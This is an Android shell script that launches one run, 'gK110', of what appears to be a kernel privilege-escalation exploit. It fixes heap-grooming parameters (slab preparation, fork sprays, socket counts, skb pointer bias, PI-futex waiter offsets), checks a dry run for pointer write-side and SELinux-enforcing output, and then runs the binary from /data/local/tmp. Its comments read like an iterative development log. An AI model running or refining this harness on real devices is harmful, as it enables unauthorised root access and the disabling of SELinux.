#!/system/bin/sh
# ===== gK110 上机脚本（2026-10-27）=====
# 铁律[4]：判据表已写（记忆节点 100）
# 教训10：显式固定并回显全部环境变量，与 gK108 基线逐项对齐
# 单变量：ptr_bias 默认 0xEC0 -> 0（SKB_BIAS_PTR=0 显式传）

cd /data/local/tmp || exit 1
rm -f ckpt.log

# ---- 基线 gK108 实测生效值（来自 ckpt_gk108_run1.log）----
export DIAG=8
export STAMP_OFF=128
export GK_CTX_LATE=1
export PREPARE_SLABS=48
export PRE_CTX_DEFER=1
export A45_DEFER=0
export GK88_F1_SPIN=2
export GK88_F1_BATCH=256
export GK88_F1_TOTAL=512
export GK39_DRAIN_WAVES=3
export GK101_PRE_FORK=1
export GK101_PRE_FORK_WAVES=1
export GK101_PRE_FORK_BATCH=700
export GK104_PRE_CTX_AFTER_KILL=0
export GK_PRE_FORK_LATE=1
export GK115_POST_F1=1
export GK115_POST_F1_WAVES=3
export GK115_POST_F1_BATCH=300
export GK106_WARMUP_SENDS=2000
export GK38_SOCKETS=8
export WAITER_BASE_4_14=1
export PIWALK_OWNER_NULL=1
export SKB_DELTA=0
# ---- 本轮唯一变量 ----
export SKB_BIAS_PTR=0

echo "=== ENV ECHO $(date) ==="
for v in DIAG STAMP_OFF GK_CTX_LATE PREPARE_SLABS PRE_CTX_DEFER A45_DEFER \
         GK88_F1_SPIN GK88_F1_BATCH GK88_F1_TOTAL GK39_DRAIN_WAVES \
         GK101_PRE_FORK GK101_PRE_FORK_WAVES GK101_PRE_FORK_BATCH \
         GK104_PRE_CTX_AFTER_KILL GK_PRE_FORK_LATE \
         GK115_POST_F1 GK115_POST_F1_WAVES GK115_POST_F1_BATCH \
         GK106_WARMUP_SENDS GK38_SOCKETS WAITER_BASE_4_14 PIWALK_OWNER_NULL \
         SKB_DELTA SKB_BIAS_PTR; do
  eval "val=\$$v"
  echo "  $v=$val"
done
echo "=== dryrun gate ==="
./gK110 --dryrun 2>&1 | grep -E 'coordinate check|ptr_bias|write side|ptr   side|selinux_enforcing'
echo "=== START $(date) ==="
./gK110
echo "=== exit=$? $(date) ==="
